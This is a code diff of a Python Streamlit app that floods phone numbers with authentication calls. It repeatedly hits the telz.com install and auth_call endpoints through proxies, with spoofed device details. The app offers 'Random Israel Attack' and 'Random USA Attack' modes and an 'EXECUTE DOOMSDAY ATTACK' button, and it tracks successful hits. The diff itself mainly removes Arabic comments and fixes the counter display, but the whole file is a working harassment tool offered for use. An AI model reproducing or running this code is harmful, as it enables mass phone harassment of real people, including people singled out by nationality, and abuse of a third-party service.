@@ -121,7 +121,6 @@ import requests
 from termcolor import colored
 import pyfiglet
 
-# الدوال الأصلية كاملة بدون أي اختصار
 def generate_unique_ids():
     timestamp = int(time.time() * 1000)
     random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
@@ -187,15 +186,14 @@ def send_auth_call_request(url, headers, payload, proxy=None):
         return response.ok and "ok" in response.text
     except: return False
 
-# --- لوحة التحكم واختيار الدول ---
+# --- لوحة التحكم ---
 st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
 attack_mode = st.radio("SELECT TARGET MODE:", ["Manual Entry", "Random Israel Attack 🇮🇱", "Random USA Attack 🇺🇸"])
 
 if attack_mode == "Manual Entry":
     col1, col2 = st.columns(2)
     with col1:
-        # إضافة أكثر من 100 دولة في القائمة (عرض أمثلة والباقي يدوي)
-        country_code = st.text_input("🌍 Country Code (Ex: 964, 20, 966...):", value="964")
+        country_code = st.text_input("🌍 Country Code:", value="964")
     with col2:
         number = st.text_input("📱 Target Phone Number:")
 else:
@@ -211,19 +209,15 @@ if 'stats' not in st.session_state:
 if 'running' not in st.session_state:
     st.session_state.running = False
 
-# الدالة الأساسية (بدون حذف أي حرف)
 def worker_task(c_code, phone_num):
     foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "ar", "hi", "he"]
     proxies_list = load_proxies()
-    
     install_url = "https://api.telz.com/app/install"
     auth_call_url = "https://api.telz.com/app/auth_call"
     headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}
 
     while st.session_state.running:
-        # منطق الهجوم العشوائي
         final_target = phone_num if phone_num != "RANDOM" else "".join(random.choices(string.digits, k=9))
-        
         foxx, fox, foxer = generate_unique_ids()
         random_android_version = str(random.randint(7, 14))
         random_lang = random.choice(foreign_langs)
@@ -250,7 +244,6 @@ def worker_task(c_code, phone_num):
         except: st.session_state.stats["error"] += 1
         time.sleep(0.01)
 
-# أزرار التشغيل والتحكم
 if st.button("🔥 EXECUTE DOOMSDAY ATTACK"):
     if number:
         st.session_state.running = True
@@ -264,9 +257,27 @@ if st.button("🛑 STOP ATTACK"):
     st.session_state.running = False
     st.rerun()
 
-# --- عدادات الهجوم مرتبة بالإنجليزية داخل إطار ---
+# --- عدادات الهجوم المصححة (تم حل الخطأ هنا) ---
 st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
 st.markdown("<h2 style='color: white;'>LIVE MONITORING</h2>", unsafe_allow_html=True)
 st.markdown('<div class="stats-container">', unsafe_allow_html=True)
-st.markdown(f'<div class="stats-box"><h3 style="color: #00ff00;">TOTAL SUCCESS</h3><h1 style="color: #00ff00;">{st.session_state.stats["ok"]}</h1></div>', unsafe_allow_html=True)
-st.markdown(f'<div class="stats-box">
+
+# عرض النجاح
+st.markdown(f'''
+<div class="stats-box">
+    <h3 style="color: #00ff00;">TOTAL SUCCESS</h3>
+    <h1 style="color: #00ff00;">{st.session_state.stats["ok"]}</h1>
+</div>
+''', unsafe_allow_html=True)
+
+# عرض الفشل
+st.markdown(f'''
+<div class="stats-box">
+    <h3 style="color: #ff0000;">TOTAL FAILED</h3>
+    <h1 style="color: #ff0000;">{st.session_state.stats["error"]}</h1>
+</div>
+''', unsafe_allow_html=True)
+
+st.markdown('</div></div>', unsafe_allow_html=True)
+st.markdown("<p style='text-align: center; color: gray;'>Developed by @PDD6P | Rights Reserved to GX3GX3</p>", unsafe_allow_html=True)
+
